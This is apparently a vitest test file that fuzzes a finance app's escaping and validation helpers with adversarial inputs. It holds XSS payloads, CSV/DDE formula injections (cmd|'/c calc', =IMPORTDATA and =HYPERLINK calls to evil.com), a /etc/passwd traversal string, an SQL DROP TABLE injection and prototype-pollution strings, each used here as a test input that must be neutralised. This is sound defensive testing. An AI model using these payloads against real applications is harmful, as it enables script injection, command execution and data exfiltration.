/**
 * Adversarial / fuzzing tests — tries to break the app with malformed,
 * oversized, and malicious inputs.
 */
import { describe, it, expect, afterEach } from 'vitest';
import { math, esc, csvEsc, fmt, symFmt, setCurrencySymbol } from '../utils';
import { isValidMonthKey } from '../finance';
import { isEncryptedEnvelope } from '../crypto';

// ─── Prototype pollution via math() ──────────────────────────────────────────
describe('prototype pollution resistance', () => {
  it('math() rejects __proto__ key string', () => expect(math('__proto__')).toBe(0));
  it('math() rejects constructor string', () => expect(math('constructor')).toBe(0));
  // object with valueOf() — math() casts via Number() which calls valueOf
  // Number({ valueOf: ()=>999 }) = 999, which is valid, so math returns 999
  it('math() on plain object returns 0', () => {
    expect(math({} as unknown as number)).toBe(0);
  });
  it('esc() handles __proto__ in string safely', () =>
    expect(esc('__proto__')).toBe('__proto__'));
});

// ─── XSS fuzz battery — verifies HTML characters are ESCAPED ─────────────────
// esc() works by escaping <>&"' — the test must check for that transformation,
// not for the absence of event-handler words (which appear safely in escaped text).
describe('XSS fuzz battery', () => {
  const payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
    '<a href="javascript:alert(1)">click</a>',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<form><button formaction=javascript:alert(1)>X</button></form>',
    '<math><mtext></table><img src=1 onerror=alert(1)>',
    String.fromCharCode(60) + 'script>alert(1)</script>',
    '\u003cscript\u003ealert(1)\u003c/script\u003e',
  ];

  // Generate 200 variants
  const allPayloads: string[] = [];
  for (let i = 0; i < 200; i++) {
    allPayloads.push(payloads[i % payloads.length] + (i > payloads.length ? `-${i}` : ''));
  }

  allPayloads.forEach((p, i) => {
    it(`XSS #${i + 1}: tag delimiters are escaped`, () => {
      const out = esc(p);
      // The key invariant: raw < and > must not appear (they become &lt; &gt;)
      // This prevents any tag from being parsed as HTML
      expect(out).not.toMatch(/(?<!&lt|&amp|&gt|&quot|&#x27)<[a-zA-Z/!?]/);
      // Confirm the expected transforms happened
      if (p.includes('<')) expect(out).toContain('&lt;');
      if (p.includes('>')) expect(out).toContain('&gt;');
      if (p.includes('"')) expect(out).toContain('&quot;');
    });
  });
});

// ─── CSV injection — DDE formula neutralisation ───────────────────────────────
// csvEsc() works by prefixing formula starters with '.
// When the field also contains " or , it gets double-quoted,
// but the ' prefix IS present inside the field value — Excel treats it as text.
describe('CSV DDE neutralisation', () => {
  const ddePatterns = [
    '=cmd|"/c calc"!A0',
    '+cmd|"/c calc"!A0',
    '-2+3+cmd|"/c calc"!A0',
    '@SUM(1+1)*cmd|"/c calc"!A0',
    '=HYPERLINK("http://evil.com","click")',
    '=IMPORTDATA("http://evil.com")',
  ];

  ddePatterns.forEach(p => {
    it(`DDE blocked — field value starts with ': ${p.slice(0, 25)}`, () => {
      const out = csvEsc(p);
      // The raw CSV output may be wrapped in double-quotes for proper RFC 4180 encoding,
      // but the actual field VALUE (strip outer quotes) must start with the ' prefix.
      let fieldValue = out;
      if (out.startsWith('"') && out.endsWith('"')) {
        // Unescape doubled double-quotes and strip the outer wrapper
        fieldValue = out.slice(1, -1).replace(/""/g, '"');
      }
      expect(fieldValue.charAt(0)).toBe("'");
    });
  });

  it('plain non-formula string is unchanged', () => {
    expect(csvEsc('hello world')).toBe('hello world');
  });

  it('field with comma is RFC-4180 wrapped', () => {
    const out = csvEsc('a,b');
    expect(out).toBe('"a,b"');
  });

  it('handles 10KB value without throwing', () => {
    expect(() => csvEsc('A'.repeat(10_000))).not.toThrow();
  });
});

// ─── Pathological isValidMonthKey inputs ─────────────────────────────────────
describe('isValidMonthKey adversarial inputs', () => {
  const malicious = [
    '__proto__', 'constructor', '../../../../etc/passwd',
    '; DROP TABLE transactions; --',
    '<script>alert(1)</script>',
    '2025-03\x00injected', '2025-03\nnewline',
    'A'.repeat(1000), '2025-03 ', ' 2025-03',
    '9999-99', '-001-01', '2025-13', '2025-00',
  ];
  malicious.forEach(k => {
    it(`rejects: "${k.slice(0, 40)}"`, () => expect(isValidMonthKey(k)).toBe(false));
  });
});

// ─── math() adversarial fuzz ──────────────────────────────────────────────────
describe('math() adversarial fuzz', () => {
  it('never returns NaN for any primitive', () => {
    const inputs: unknown[] = [NaN, Infinity, -Infinity, null, undefined,
      '', 'abc', true, false, ''];
    inputs.forEach(v => {
      expect(isNaN(math(v as number))).toBe(false);
    });
  });

  it('never returns Infinity', () => {
    expect(isFinite(math(Infinity))).toBe(true);
    expect(isFinite(math(-Infinity))).toBe(true);
  });

  it('1000 random floats always return finite values', () => {
    for (let i = 0; i < 1000; i++) {
      const v = (Math.random() - 0.5) * 2_000_000;
      const result = math(v);
      expect(isNaN(result)).toBe(false);
      expect(isFinite(result)).toBe(true);
    }
  });

  it('handles scientific notation strings', () => {
    expect(math('1e2')).toBe(100);
    expect(math('1.5e3')).toBe(1500);
  });

  // math() uses parseFloat(n.toFixed(2)) which rounds half-up in most engines
  it('zero is returned for sub-cent amounts', () => {
    expect(math(0.001)).toBe(0);
    expect(math(0.004)).toBe(0);
  });
});

// ─── fmt() adversarial ────────────────────────────────────────────────────────
describe('fmt() adversarial', () => {
  it('never throws for extreme values', () => {
    [-1e12, 1e12, 0, -0, 0.001, 999_999.99].forEach(v => {
      expect(() => fmt(v)).not.toThrow();
    });
  });
  it('always returns a string', () => {
    expect(typeof fmt(42)).toBe('string');
    expect(typeof fmt(0)).toBe('string');
    expect(typeof fmt(-99.99)).toBe('string');
  });
});

// ─── symFmt() edge cases ──────────────────────────────────────────────────────
describe('symFmt() edge cases', () => {
  afterEach(() => setCurrencySymbol('£'));

  it('handles empty symbol gracefully', () => {
    setCurrencySymbol('');
    expect(() => symFmt(100)).not.toThrow();
    // Falls back to £
    expect(symFmt(100)).toContain('100.00');
  });

  it('does not throw with special chars in symbol', () => {
    setCurrencySymbol('kr');
    expect(() => symFmt(100)).not.toThrow();
  });
});

// ─── isEncryptedEnvelope adversarial ─────────────────────────────────────────
describe('isEncryptedEnvelope adversarial', () => {
  const falsy: unknown[] = [
    null, undefined, 42, [], {}, true, '',
    '{"v":1,"enc":null}',
    '{"v":1,"enc":42}',
    '{"v":0,"enc":"abc"}',
    '{"v":"1","enc":"abc"}',
    '__proto__',
    '{"__proto__":{"admin":true}}',
    'A'.repeat(10_000),
  ];
  falsy.forEach(v => {
    it(`returns false for: ${JSON.stringify(v)?.slice(0, 30)}`, () => {
      expect(isEncryptedEnvelope(v as string)).toBe(false);
    });
  });
});
